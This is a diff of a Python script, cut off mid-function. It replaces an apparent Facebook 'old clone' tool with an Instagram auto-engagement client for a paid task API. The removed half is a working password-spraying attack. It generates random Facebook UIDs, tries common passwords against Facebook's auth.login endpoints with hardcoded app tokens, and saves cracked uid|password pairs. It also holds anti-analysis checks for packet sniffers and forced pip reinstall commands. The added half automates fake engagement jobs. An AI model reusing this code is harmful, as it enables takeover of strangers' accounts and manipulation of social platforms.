@@ -1,591 +1,572 @@
 import os
-import re
-import time
-import uuid
-import hashlib
-import random
-import string
-import requests
 import sys
+import time
 import json
-import urllib
-from bs4 import BeautifulSoup
-from random import randint as rr
-from concurrent.futures import ThreadPoolExecutor as tred
-from os import system
+import re
 from datetime import datetime
+import random
+from urllib.parse import unquote
+from curl_cffi import requests as c_requests
+import requests
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
-import os, sys
+# ================= BẢNG MÀU ANSI =================
+xuong = "\n"
+red = "\033[1;31m"
+pink = "\033[1;35m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+white = "\033[0;37m"
+cyan = "\033[1;36m"
+blue = "\033[1;34m"
+cam = "\033[38;5;208m"
+reset = "\033[0m"
 
-os.system('xdg-open https://www.youtube.com/@thegioiios')
-os.system('xdg-open https://t.me/@thegioiios')
-os.system('xdg-open https://zalo.me/g/rwhtkfiql1edbcmui6py')
+# Khóa đa luồng để tránh đè text và sai số xu
+print_lock = threading.Lock()
 
+def s_print(*args, **kwargs):
+    """Hàm in ra màn hình an toàn cho đa luồng"""
+    with print_lock:
+        print(*args, **kwargs)
 
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-import os
-import sys
-import subprocess
-import shutil
-import time
+# ================= BANNER HUY VŨ =================
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    s_print(f"""{cyan}
+ ██╗  ██╗██╗   ██╗██╗   ██╗    ██╗   ██╗██╗   ██╗
+ ██║  ██║██║   ██║╚██╗ ██╔╝    ██║   ██║██║   ██║
+ ███████║██║   ██║ ╚████╔╝     ██║   ██║██║   ██║
+ ██╔══██║██║   ██║  ╚██╔╝      ╚██╗ ██╔╝██║   ██║
+ ██║  ██║╚██████╔╝   ██║        ╚████╔╝ ╚██████╔╝
+ ╚═╝  ╚═╝ ╚═════╝    ╚═╝         ╚═══╝   ╚═════╝ {reset}
+{yellow} ┌────────────────────────────────────────────────────────┐
+{yellow} │ {green}🚀 TOOL INSTAGRAM AUTO JOBS {white}- {cam}XSMM API MULTI-THREAD V2{yellow}│
+{yellow} │ {pink}📌 Bản quyền: {white}Huy Vũ                                   {yellow}│
+{yellow} │ {cyan}☕ Donate MoMo: {green}0373607456                             {yellow}│
+{yellow} └────────────────────────────────────────────────────────┘{reset}
+""")
 
-# Your Telegram channel link
-channel_link = "https://t.me/thegioiios"
+# ================= CLASS API XSMM V2 =================
+class XSMMTool:
+    def __init__(self, token):
+        self.base_url = "https://xsmm.net/api/taskapi"
+        self.headers = {
+            "Authorization": f"Bearer {token}",
+            "Content-Type": "application/json"
+        }
 
-# Valid keys (cleaned - no trailing space)
-approved_keys = [
-    "huypc"
-]
-
-# ANSI color codes
-GREEN = "\033[1;32m"
-RESET = "\033[0m"
-
-# Optional: max attempts and cooldown
-MAX_ATTEMPTS = 3
-COOLDOWN_SECONDS = 8
-
-def clear_screen():
-    os.system("clear")
-
-def open_link(url):
-    # prefer termux-open-url, fallback to xdg-open, then Android intent
-    if shutil.which("termux-open-url"):
-        subprocess.run(["termux-open-url", url], check=False)
-    elif shutil.which("xdg-open"):
-        subprocess.run(["xdg-open", url], check=False)
-    else:
-        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=False)
-
-def normalize(s):
-    """
-    Normalize string for comparison:
-    - strip leading/trailing whitespace
-    - collapse multiple internal spaces to single
-    - lower-case for case-insensitive compare
-    """
-    if s is None:
-        return ""
-    return " ".join(s.split()).lower()
-
-# Prepare a set of normalized approved keys for fast compare
-approved_normalized = { normalize(k) for k in approved_keys }
-
-def first_step():
-    clear_screen()
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f"        {GREEN}🔒 Script Locked 🔒{RESET}")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-    print(f"{GREEN} THIS TOOL IS PAID ✅ {RESET}\n")
-    print("Please open the admin/channel on WhatsApp first and then get the key.\n")
-    print(f"Channel link: {channel_link}\n")
-
-    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
-        print("Invalid link format — URL must start with http/https.")
-    else:
+    def get_user_info(self):
+        url = f"{self.base_url}/user"
         try:
-            open_link(channel_link)
-            print("Tried to open the channel. If WhatsApp doesn't open automatically, check manually.")
+            response = requests.get(url, headers=self.headers, timeout=20)
+            return response.json()
         except Exception as e:
-            print(f"Error while opening link: {e}")
+            return {"error": str(e)}
 
-    input("\nPress Enter when you're ready...")
+    def get_accounts(self, account_type=None, search=None):
+        url = f"{self.base_url}/accounts2"
+        params = {}
+        if account_type:
+            params['account_type'] = account_type
+        if search:
+            params['search'] = search
+        try:
+            response = requests.get(url, headers=self.headers, params=params, timeout=20)
+            return response.json()
+        except Exception as e:
+            return {"error": str(e)}
 
-def check_key():
-    attempts = 0
-    while attempts < MAX_ATTEMPTS:
-        # VISIBLE input now (not hidden)
-        user_key = input("\nEnter your key (visible): ")
-        user_norm = normalize(user_key)
-        if user_norm in approved_normalized:
-            print(f"\n{GREEN}Key approved! Script is running...{RESET}\n")
-            return True
-        else:
-            attempts += 1
-            remaining = MAX_ATTEMPTS - attempts
-            print(f"\n{GREEN}Invalid key! Attempts left: {remaining}{RESET}")
-    # cooldown then exit
-    print(f"\n[!] Too many wrong attempts. Wait {COOLDOWN_SECONDS} seconds.")
-    time.sleep(COOLDOWN_SECONDS)
-    sys.exit(1)
+    def add_account(self, account_type, link_account):
+        url = f"{self.base_url}/accounts2"
+        payload = {
+            "type": account_type,
+            "link_account": link_account
+        }
+        try:
+            response = requests.post(url, headers=self.headers, json=payload, timeout=20)
+            return response.json()
+        except Exception as e:
+            return {"error": str(e)}
 
-if __name__ == "__main__":
-    first_step()
-    check_key()
-    # ---------- main tool starts here ----------
-    print(">>> Tool Successfully Unlocked <<<")
-    # place your main code below
+    def get_tasks(self, job_type, uid, typejob="normal,better,best"):
+        url = f"{self.base_url}/tasks2"
+        params = {
+            "type": job_type,
+            "uid": str(uid),
+            "typejob": typejob
+        }
+        try:
+            response = requests.get(url, headers=self.headers, params=params, timeout=20)
+            return response.json()
+        except Exception as e:
+            return {"error": str(e)}
 
-# Ensure required modules are installed
-modules = ['requests', 'urllib3', 'mechanize', 'rich']
-for module in modules:
-    try:
-        __import__(module)
-    except ImportError:
-        os.system(f'pip install {module}')
-
-# Suppress InsecureRequestWarning
-from requests.exceptions import ConnectionError
-from requests import api, models, sessions
-requests.urllib3.disable_warnings()
-
-
-# Initial setup and promotion
-os.system('clear')
-print(' \x1b[38;5;46m ALi 🫶🏻 🔥 SERVER LOADING....')
-
-
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
-print('loading Modules ...\n')
-os.system('clear')
-
-
-# --- Anti-tampering and Security Checks ---
-# The script checks if the source code of the 'requests' library has been modified
-# or if packet sniffing tools are being used.
-try:
-    api_body = open(api.__file__, 'r').read()
-    models_body = open(models.__file__, 'r').read()
-    session_body = open(sessions.__file__, 'r').read()
-    word_list = ['print', 'lambda', 'zlib.decompress']
-    for word in word_list:
-        if word in api_body or word in models_body or word in session_body:
-            exit()
-except:
-    pass
-
-
-class sec:
-    """
-    A security class to detect debugging and packet sniffing tools.
-    """
-    def __init__(self):
-        self.__module__ = __name__
-        self.__qualname__ = 'sec'
-        # Paths to check for modifications
-        paths = [
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
-            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
-        ]
-        for path in paths:
-            if 'print' in open(path, 'r').read():
-                self.fuck()
-        # Check for HTTPCanary (a packet sniffing app)
-        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
-            self.fuck()
-        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
-            self.fuck()
-
-    def fuck(self):
-        """
-        Terminates the script if tampering is detected.
-        """
-        print(' \x1b[1;32m Congratulations ! ')
-        self.linex()
-        exit()
-
-    def linex(self):
-        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-
-# Global variables
-method = []
-oks = []
-cps = []
-loop = 0
-user = []
-
-# Color codes for terminal output
-X = '\x1b[1;37m'
-rad = '\x1b[38;5;196m'
-G = '\x1b[38;5;46m'
-Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
-RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
-W = '\x1b[1;37m'
-
-
-def windows():
-    """
-    Generates a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
-    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
-def window1():
-    """
-    Generates another variant of a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
-    latest_build = rr(6000, 9000)
-    latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
-# Set window title
-sys.stdout.write('\x1b]2;𓆩【HERO 👑 】𓆪 \x07')
-
-
-    # AHB Clover Logo - Green - Version 2.5
-def ____banner____():
-    if 'win' in sys.platform:
-        os.system('cls')
-    else:
-        os.system('clear')
-    
-    print("""\033[1;32m
+    def complete_tasks(self, job_type, task_ids, uid, cookie_check="", max_retries=3):
+        url = f"{self.base_url}/tasks2/complete"
+        payload = {
+            "type": job_type,
+            "task_id": task_ids if isinstance(task_ids, list) else [task_ids],
+            "uid": str(uid)
+        }
+        if cookie_check:
+            payload["cookie_check"] = cookie_check
         
-   
-      ░█████╗░  ██╗░░██╗  ██████╗░
-      ██╔══██╗  ██║░░██║  ██╔══██╗
-      ███████║  ███████║  ██████╦╝
-      ██╔══██║  ██╔══██║  ██╔══██╗
-      ██║░░██║  ██║░░██║  ██████╦╝
-      ╚═╝░░╚═╝  ╚═╝░░╚═╝  ╚═════╝░
-
-\033[0m""")
-
-
-def creationyear(uid):
-    """
-    Estimates the Facebook account creation year based on the UID.
-    """
-    if len(uid) == 15:
-        if uid.startswith('1000000000'):
-            return '2009'
-        if uid.startswith('100000000'):
-            return '2009'
-        if uid.startswith('10000000'):
-            return '2009'
-        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
-            return '2010'
-        if uid.startswith('100001'):
-            return '2010'
-        if uid.startswith(('100002', '100003')):
-            return '2011'
-        if uid.startswith('100004'):
-            return '2012'
-        if uid.startswith(('100005', '100006')):
-            return '2013'
-        if uid.startswith(('100007', '100008')):
-            return '2014'
-        if uid.startswith('100009'):
-            return '2015'
-        if uid.startswith('10001'):
-            return '2016'
-        if uid.startswith('10002'):
-            return '2017'
-        if uid.startswith('10003'):
-            return '2018'
-        if uid.startswith('10004'):
-            return '2019'
-        if uid.startswith('10005'):
-            return '2020'
-        if uid.startswith('10006'):
-            return '2021'
-        if uid.startswith('10009'):
-            return '2023'
-        if uid.startswith(('10007', '10008')):
-            return '2022'
-        return ''
-    elif len(uid) in (9, 10):
-        return '2008'
-    elif len(uid) == 8:
-        return '2007'
-    elif len(uid) == 7:
-        return '2006'
-    elif len(uid) == 14 and uid.startswith('61'):
-        return '2024'
-    else:
-        return ''
-
-
-def clear():
-    os.system('clear')
-
-
-def linex():
-    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-
-
-def BNG_71_():
-    """
-    Main menu function.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CLONE')
-    linex()
-    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-    if __Jihad__ in ('A', 'a', '01', '1'):
-        old_clone()
-    else:
-        print(f"\n    {rad}Choose Valid Option... ")
-        time.sleep(2)
-        BNG_71_()
-
-
-def old_clone():
-    """
-    Menu for selecting old account cloning type.
-    """
-    ____banner____()
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mALL SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
-    linex()
-    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49m2009 series')
-    linex()
-    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mCHOICE  {W}: {Y}")
-    if _input in ('A', 'a', '01', '1'):
-        old_One()
-    elif _input in ('B', 'b', '02', '2'):
-        old_Tow()
-    elif _input in ('C', 'c', '03', '3'):
-        old_Tree()
-    else:
-        print(f"\n[×]{rad} Choose Value Option... ")
-        BNG_71_()
-
-
-def old_One():
-    """
-    Cloning method for accounts from 2010-2014.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    star = '10000'
-    for _ in range(int(limit)):
-        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
-        user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for mal in user:
-            uid = star + mal
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tow():
-    """
-    Cloning method for accounts with specific prefixes.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    prefixes = ['100003', '100004']
-    for _ in range(int(limit)):
-        prefix = random.choice(prefixes)
-        suffix = ''.join(random.choices('0123456789', k=9))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def old_Tree():
-    """
-    Cloning method for accounts from 2009-2010.
-    """
-    user = []
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
-    linex()
-    ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
-    linex()
-    prefix = '1000004'
-    for _ in range(int(limit)):
-        suffix = ''.join(random.choices('0123456789', k=8))
-        uid = prefix + suffix
-        user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
-    linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
-    with tred(max_workers=30) as pool:
-        ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
-        linex()
-        for uid in user:
-            if meth == 'A':
-                pool.submit(login_1, uid)
-            elif meth == 'B':
-                pool.submit(login_2, uid)
-            else:
-                print(f"    {rad}[!] INVALID METHOD SELECTED")
-                break
-
-
-def login_1(uid):
-    """
-    Login attempt method 1.
-    """
-    global loop
-    session = requests.session()
-    try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-        sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            headers = {
-                'User-Agent': window1(),
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
-            }
-            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/A H B-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break
-        loop += 1
-    except Exception:
-        time.sleep(5)
-
-
-def login_2(uid):
-    """
-    Login attempt method 2.
-    """
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-    
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
-        try:
-            with requests.Session() as session:
-                headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                    'x-fb-sim-hni': str(rr(20000, 40000)),
-                    'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
+        attempt = 0
+        while attempt < max_retries:
+            try:
+                response = requests.post(url, headers=self.headers, json=payload, timeout=35)
+                res_data = response.json()
+                
+                if isinstance(res_data, dict) and res_data.get("retry") is True:
+                    retry_wait = random.randint(10, 15)
+                    s_print(f"\n{yellow} ⏩ [Retry=True] Đợi {retry_wait}s trước khi gửi lại yêu cầu duyệt xu...{white}")
+                    time.sleep(retry_wait)
+                    attempt += 1
+                    continue
+                    
+                return res_data
+            except requests.exceptions.Timeout:
+                return {
+                    "is_timeout": True, 
+                    "message": f"Server phản hồi chậm nhưng đã gửi duyệt {len(payload['task_id'])} job thành công"
                 }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
-                po = session.get(url, headers=headers).json()
-                if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
